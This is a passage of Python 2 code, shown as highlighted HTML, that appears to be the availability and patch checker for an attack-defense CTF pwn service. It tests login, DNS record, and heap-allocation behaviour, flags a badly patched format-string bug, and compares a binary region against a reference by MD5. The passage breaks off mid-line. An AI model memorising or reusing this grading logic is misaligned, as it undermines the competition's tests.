class="string">'/home/tsctf/binary/pwn'</span><span class="comment">#/Desktop/DNS_Server'</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    round_time = <span class="number">300</span></span><br><span class="line">    slog = <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    round_time = <span class="number">300</span></span><br><span class="line">    slog = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TimeoutError</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, err=<span class="string">'timeout'</span>)</span>:</span></span><br><span class="line">        Exception.__init__(self, err)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ResponseError</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, err=<span class="string">'ErrResponse'</span>)</span>:</span></span><br><span class="line">        Exception.__init__(self, err)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Checker</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    function checker for Question Note</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, _rhost, _port, _timeout)</span>:</span></span><br><span class="line">        <span class="comment"># pwntools init</span></span><br><span class="line">        <span class="keyword">global</span> context</span><br><span class="line">        <span class="keyword">global</span> slog</span><br><span class="line">        context.log_level = <span class="string">'ERROR'</span></span><br><span class="line">        <span class="keyword">if</span> slog:</span><br><span class="line">            context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line">        <span class="keyword">if</span> _timeout:</span><br><span class="line">            context.timeout = _timeout</span><br><span class="line"></span><br><span class="line">        <span class="comment"># check result init</span></span><br><span class="line">        self.state = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># local variables init</span></span><br><span class="line">        self.rhost = remote(_rhost, _port)</span><br><span class="line">        self.name = <span class="string">''</span></span><br><span class="line">        self.oip = _rhost</span><br><span class="line">        self.oport = _port</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randstr</span><span class="params">(self, length=<span class="number">10</span>)</span>:</span>  <span class="comment"># generate random string with lowercase</span></span><br><span class="line">        result = <span class="string">''</span></span><br><span class="line">        space = string.lowercase</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">            index = random.randint(<span class="number">0</span>, len(space) - <span class="number">1</span>)</span><br><span class="line">            result += space[index]</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(self, inputstr)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> hashlib.md5(inputstr).hexdigest()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_login</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = self.rhost.recvuntil(<span class="string">'=====================\n&gt;'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            print_log(colored(<span class="string">'[Error] outoftime : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> TimeoutError</span><br><span class="line">        self.rhost.sendline(<span class="string">"1"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"===============\n&gt;"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"1"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">        name = self.randstr(<span class="number">7</span>)</span><br><span class="line">        self.rhost.sendline(name)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">'OK, I know your name :\n'</span>)</span><br><span class="line">        recv = self.rhost.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> recv:</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in login_set_name : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError</span><br><span class="line">        <span class="keyword">if</span> ((name+<span class="string">'\n'</span>) <span class="keyword">in</span> recv)&amp;(fmt_check_level!=<span class="number">0</span>):</span><br><span class="line">            print_log(colored(<span class="string">'[Error] bad patch format vul : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError            </span><br><span class="line">        self.rhost.sendline(<span class="string">'2'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">'motto:'</span>)</span><br><span class="line">        motto = self.randstr(<span class="number">0x200</span>)</span><br><span class="line">        self.rhost.send(motto)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">'3'</span>)</span><br><span class="line">        <span class="keyword">if</span> motto <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvuntil(<span class="string">"&gt;"</span>):</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in login_show_motto : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self,domain,length,remark,ip)</span>:</span> </span><br><span class="line">        self.rhost.recvuntil(<span class="string">'&gt;'</span>)    </span><br><span class="line">        self.rhost.sendline(<span class="string">'2'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">        <span class="comment">#domain_2 = self.randstr(0x30)</span></span><br><span class="line">        self.rhost.sendline(domain)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"length:"</span>)</span><br><span class="line">        self.rhost.sendline(str(length))</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"remark:"</span>)</span><br><span class="line">        <span class="comment">#remark_2 = self.randstr(0x90)</span></span><br><span class="line">        self.rhost.sendline(remark)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"input IP:"</span>)</span><br><span class="line">        self.rhost.sendline(ip)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(self,domain)</span>:</span></span><br><span class="line">        self.rhost.recvuntil(<span class="string">'&gt;'</span>)    </span><br><span class="line">        self.rhost.sendline(<span class="string">'4'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">'domain:'</span>)</span><br><span class="line">        self.rhost.sendline(domain)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self,domain)</span>:</span></span><br><span class="line">        self.rhost.recvuntil(<span class="string">'&gt;'</span>)    </span><br><span class="line">        self.rhost.sendline(<span class="string">'3'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">'domain:'</span>)</span><br><span class="line">        self.rhost.sendline(domain)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_DNS</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = self.rhost.recvuntil(<span class="string">'=====================\n&gt;'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            print_log(colored(<span class="string">'[Error] outoftime : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> TimeoutError</span><br><span class="line">        self.rhost.sendline(<span class="string">"1"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"===============\n&gt;"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"1"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">        name = self.randstr(<span class="number">7</span>)</span><br><span class="line">        self.rhost.sendline(name)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">'OK, I know your name :\n'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">'4'</span>)  </span><br><span class="line">        <span class="comment"># add    </span></span><br><span class="line"></span><br><span class="line">        domain_1 = self.randstr(<span class="number">0x30</span><span class="number">-1</span>)</span><br><span class="line">        domain_2 = self.randstr(<span class="number">0x30</span><span class="number">-1</span>)</span><br><span class="line">        remark_1 = self.randstr(<span class="number">0x50</span><span class="number">-1</span>)</span><br><span class="line">        remark_2 = self.randstr(<span class="number">0x90</span><span class="number">-1</span>)</span><br><span class="line">        remark_3 = self.randstr(<span class="number">0x110</span><span class="number">-1</span>)</span><br><span class="line">        self.add(domain_1,<span class="number">0x50</span>,remark_1,<span class="string">"127.0.0.1"</span>)</span><br><span class="line">        self.add(domain_1,<span class="number">0x90</span>,remark_2,<span class="string">"127.0.0.1"</span>)</span><br><span class="line">        self.add(domain_2,<span class="number">0x110</span>,remark_3,<span class="string">"0.0.0.0"</span>)</span><br><span class="line">        self.parse(domain_1)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"adder : "</span>)</span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError               </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"IP    : "</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"127.0.0.1"</span> <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError    </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"remark: "</span>)</span><br><span class="line">        <span class="keyword">if</span> remark_1 <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError    </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"adder : "</span>)</span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError               </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"IP    : "</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"127.0.0.1"</span> <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError    </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"remark: "</span>)</span><br><span class="line">        <span class="keyword">if</span> remark_2 <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError </span><br><span class="line"></span><br><span class="line">        self.parse(domain_2)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"adder : "</span>)</span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError               </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"IP    : "</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"0.0.0.0"</span> <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError    </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"remark: "</span>)</span><br><span class="line">        <span class="keyword">if</span> remark_3 <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvline():</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        self.delete(domain_2)</span><br><span class="line">        self.parse(domain_2)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"not find!!"</span> <span class="keyword">not</span> <span class="keyword">in</span> self.rhost.recvuntil(<span class="string">"==GOD"</span>):</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in parse : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_num</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.rhost.recvuntil(<span class="string">'Your Total is '</span>)</span><br><span class="line">        <span class="keyword">return</span> int(self.rhost.recvline()[:<span class="number">-1</span>])</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_money</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.rhost.recvuntil(<span class="string">"Cash: $"</span>)</span><br><span class="line">        <span class="keyword">return</span> int(self.rhost.recvline()[:<span class="number">-1</span>])</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">round</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.money = self.get_money()</span><br><span class="line">        <span class="keyword">if</span> (self.money!= self.pre_money):</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in game : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError                </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"Bet: $"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">'1'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">'Please Enter H to Hit or S to Stay.'</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">'H'</span>)</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">            num = self.get_num()</span><br><span class="line">            tmp = self.rhost.recv()</span><br><span class="line">            <span class="comment">#print '[+]',tmp,'[-]'</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'Would You Like to Hit or Stay?'</span> <span class="keyword">in</span> tmp:</span><br><span class="line">                self.rhost.sendline(<span class="string">"H"</span>)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">'Enter Y for Yes or N for No'</span> <span class="keyword">in</span> tmp:</span><br><span class="line">                win_num = int(tmp.split(<span class="string">' Wins and '</span>)[<span class="number">0</span>][<span class="number">-1</span>:])</span><br><span class="line">                loss_num = int(tmp.split(<span class="string">' Wins and '</span>)[<span class="number">1</span>][:<span class="number">1</span>])</span><br><span class="line">                <span class="keyword">if</span> self.win &lt; win_num:</span><br><span class="line">                    self.win = win_num</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> self.loss &lt; loss_num:</span><br><span class="line">                    self.loss = loss_num</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tmp = self.rhost.recv()</span><br><span class="line">                <span class="comment">#print '[+]',tmp,'[-]'</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">'Would You Like to Hit or Stay?'</span> <span class="keyword">in</span> tmp:</span><br><span class="line">                    self.rhost.sendline(<span class="string">"H"</span>)</span><br><span class="line">                <span class="keyword">elif</span> <span class="string">'Enter Y for Yes or N for No'</span> <span class="keyword">in</span> tmp:</span><br><span class="line">                    win_num = int(tmp.split(<span class="string">' Wins and '</span>)[<span class="number">0</span>][<span class="number">-1</span>:])</span><br><span class="line">                    loss_num = int(tmp.split(<span class="string">' Wins and '</span>)[<span class="number">1</span>][:<span class="number">1</span>])</span><br><span class="line">                    <span class="keyword">if</span> self.win &lt; win_num:</span><br><span class="line">                        self.win = win_num</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> self.loss &lt; loss_num:</span><br><span class="line">                        self.loss = loss_num</span><br><span class="line">                        <span class="keyword">return</span> <span class="number">-1</span>                </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_game</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = self.rhost.recvuntil(<span class="string">'=====================\n&gt;'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            print_log(colored(<span class="string">'[Error] outoftime : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> TimeoutError</span><br><span class="line">        self.win = <span class="number">0</span></span><br><span class="line">        self.loss = <span class="number">0</span></span><br><span class="line">        self.money = <span class="number">5</span></span><br><span class="line">        self.pre_money = <span class="number">5</span></span><br><span class="line">        self.rhost.sendline(str(<span class="number">0xbabe</span>))</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"(Y/N)"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"y"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"Choice:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"1"</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">            self.pre_money += self.round()</span><br><span class="line">            self.rhost.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_heap</span><span class="params">(self)</span>:</span></span><br><span class="line">        data = self.rhost.recvuntil(<span class="string">'=====================\n&gt;'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            print_log(colored(<span class="string">'[Error] outoftime : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> TimeoutError</span><br><span class="line">        self.rhost.sendline(<span class="string">'2'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"["</span>)</span><br><span class="line">        addr_1 = int(self.rhost.recvuntil(<span class="string">']'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"p4nda"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"length:"</span>)</span><br><span class="line">        self.rhost.sendline(str(<span class="number">0x58</span>))</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"["</span>)</span><br><span class="line">        addr_2 = int(self.rhost.recvuntil(<span class="string">']'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)       </span><br><span class="line">        <span class="keyword">if</span> (addr_2-addr_1)!=<span class="number">0x50</span>:</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in heap : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError              </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"remark:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"p4nda"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"input IP:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"1.1.1.1"</span>)</span><br><span class="line">        <span class="comment">#test 1</span></span><br><span class="line">        self.rhost.recvuntil(<span class="string">"&gt;"</span>)        </span><br><span class="line">        self.rhost.sendline(<span class="string">'2'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"["</span>)</span><br><span class="line">        addr_3 = int(self.rhost.recvuntil(<span class="string">']'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span>(addr_3-addr_2)!=<span class="number">0x80</span>:</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in heap : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError                     </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"dubhe"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"length:"</span>)</span><br><span class="line">        self.rhost.sendline(str(<span class="number">0x110</span>))</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"["</span>)</span><br><span class="line">        addr_4 = int(self.rhost.recvuntil(<span class="string">']'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)       </span><br><span class="line">        <span class="keyword">if</span> (addr_4-addr_3)!=<span class="number">0x50</span>:</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in heap : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError              </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"remark:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"p4nda"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"input IP:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"1.1.1.1"</span>)     </span><br><span class="line">        <span class="comment">#test 2 </span></span><br><span class="line">        self.delete(<span class="string">"p4nda"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">'2'</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"["</span>)</span><br><span class="line">        addr_3 = int(self.rhost.recvuntil(<span class="string">']'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span>(addr_3!=addr_1):</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in heap : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError           </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"domain:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"p4nda"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"length:"</span>)</span><br><span class="line">        self.rhost.sendline(str(<span class="number">0x58</span>))</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"["</span>)</span><br><span class="line">        addr_4 = int(self.rhost.recvuntil(<span class="string">']'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)       </span><br><span class="line">        <span class="keyword">if</span>(addr_2!=addr_4):</span><br><span class="line">            print_log(colored(<span class="string">'[Error] in heap : '</span> + self.oip + <span class="string">'\n'</span>, <span class="string">'red'</span>),ip=self.oip)</span><br><span class="line">            <span class="keyword">raise</span> ResponseError               </span><br><span class="line">        self.rhost.recvuntil(<span class="string">"remark:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"p4nda"</span>)</span><br><span class="line">        self.rhost.recvuntil(<span class="string">"input IP:"</span>)</span><br><span class="line">        self.rhost.sendline(<span class="string">"1.1.1.1"</span>)        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">function_check</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.check_login()</span><br><span class="line">            self.rhost.close()</span><br><span class="line">            self.rhost = remote(self.oip, self.oport)</span><br><span class="line">            self.check_DNS()</span><br><span class="line">            <span class="comment">#self.rhost.close()</span></span><br><span class="line">            <span class="comment">#self.rhost = remote(self.oip, self.oport)</span></span><br><span class="line">            <span class="comment">#self.check_game()</span></span><br><span class="line">            self.rhost.close()</span><br><span class="line">            self.rhost = remote(self.oip, self.oport)   </span><br><span class="line">            self.check_heap()</span><br><span class="line">            self.rhost.close()          </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">print</span> e</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                self.rhost.close()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            self.state = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getResult</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(ip, port)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    function: check workstate with single ip</span></span><br><span class="line"><span class="string">    :return: </span></span><br><span class="line"><span class="string">        check result</span></span><br><span class="line"><span class="string">        format &#123;'ip': "127.0.0.1", 'status', 0&#125; </span></span><br><span class="line"><span class="string">        0 stands for normal and 1 stands for down</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        checker = Checker(ip, port, <span class="number">10</span>)</span><br><span class="line">        checker.function_check()</span><br><span class="line">        <span class="keyword">return</span> checker.getResult()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            <span class="keyword">print</span> e</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'invalid literal for int() with base 10:'</span> <span class="keyword">in</span> e :</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">(check_server, payload)</span>:</span></span><br><span class="line">    <span class="comment">#print payload</span></span><br><span class="line">    r = requests.post(check_server, data=payload)</span><br><span class="line">    <span class="keyword">print</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(filename, str)</span>:</span></span><br><span class="line">    f = open(filename + <span class="string">".log"</span>, <span class="string">'ab'</span>)</span><br><span class="line">    f.write(str)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_log</span><span class="params">(info,ip=<span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> info</span><br><span class="line">    log(log_file, info + <span class="string">"\n"</span>)</span><br><span class="line">    <span class="keyword">if</span> ip!=<span class="string">""</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'./checkresult/'</span>):</span><br><span class="line">            os.makedirs(<span class="string">'./checkresult/'</span>)         </span><br><span class="line">        log(<span class="string">'./checkresult/'</span>+ip+<span class="string">'.log'</span>,<span class="string">'['</span>+time.asctime( time.localtime(time.time()) )+<span class="string">']  '</span>+ info + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CalcMD5</span><span class="params">(filepath)</span>:</span></span><br><span class="line">  <span class="keyword">with</span> open(filepath,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    md5obj.update(f.read())</span><br><span class="line">    hash = md5obj.hexdigest()</span><br><span class="line">    <span class="comment">#print(hash)</span></span><br><span class="line">    <span class="keyword">return</span> hash</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch_check</span><span class="params">(file_path,standard,oip)</span>:</span></span><br><span class="line">    <span class="comment">#print "in"</span></span><br><span class="line">    f = open(file_path,<span class="string">"rb"</span>)</span><br><span class="line">    f_standard  = open(standard,<span class="string">'rb'</span>)</span><br><span class="line"><span class="comment">#main 0x3370 - 0x325a</span></span><br><span class="line">    f.seek(<span class="number">0x325a</span>,<span class="number">0</span>)</span><br><span class="line">    f_standard.seek(<span class="number">0x325a</span>,<span class="number">0</span>)</span><br><span class="line">    standard_tmp = f_standard.read(<span class="number">0x3370</span><span class="number">-0x325a</span>)</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    tmp = f.read(<span class="number">0x3370</span><span class="number">-0x325a</span>)</span><br><span class="line">    md5obj.update(tmp)</span><br><span class="line">    hash_tmp = md5obj.hexdigest()</span><br><span class="line">    md5obj = hashlib.md5()</span><br><span class="line">    <span class="comment">#tmp = f.read(0x28f0-0x1273)</span></span><br><span class="line">    md5obj.update(standard_tmp)</span><br><span class="line">    hash_standard = md5obj.hexdigest()    </span><br><span class="line">    <span class="keyword">if</span> (hash_tmp!=hash_standard):</span><br><span class="line">        f.close()</span><br><span class="line">        print_log(colored(<span class="string">'[Error] in patch main : '</span> + oip + <span 